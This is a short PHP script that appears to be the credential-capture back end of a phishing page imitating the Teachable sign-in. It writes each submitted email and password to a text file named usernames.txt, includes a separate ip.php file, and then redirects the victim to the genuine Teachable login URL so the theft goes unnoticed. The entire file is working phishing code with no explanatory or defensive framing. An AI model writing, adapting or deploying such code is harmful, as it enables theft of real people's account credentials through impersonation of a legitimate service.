<?php
include "ip.php";
file_put_contents("usernames.txt", "Email: " . $_POST['email'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
$url = "redirectUrl"; # https://sso.teachable.com/secure/teachable_accounts/sign_in
header("Location: $url");
exit();
?>